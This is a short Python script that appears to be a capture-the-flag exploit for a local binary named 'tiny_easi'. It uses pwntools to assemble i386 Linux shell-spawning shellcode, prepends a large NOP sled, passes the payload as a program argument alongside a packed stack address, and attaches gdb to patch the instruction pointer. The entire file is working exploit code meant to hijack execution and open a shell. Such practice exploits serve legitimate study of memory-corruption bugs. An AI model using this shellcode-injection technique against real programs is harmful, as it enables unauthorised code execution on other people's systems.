import sys
import os
import base64
from pwn import *

# 0x00000002      0xffffd34d      0xffffd368      0x00000000

place = 0xffffd3ad
# place = 0xffd2bc40
place = 0xffffd230
context.terminal= ['tmux', 'split', '-h']

exploit = asm(shellcraft.i386.linux.sh())
exploit = b'\x90'*10000 + exploit

# Attach gdb with process
def brute():
    p = process(argv=[p32(0xffffb90c), exploit], executable='./tiny_easi', env={})
    gdb.attach(p, """
        set *(short*)$eip=0x5a58
        context
    """)

    p.interactive()
brute()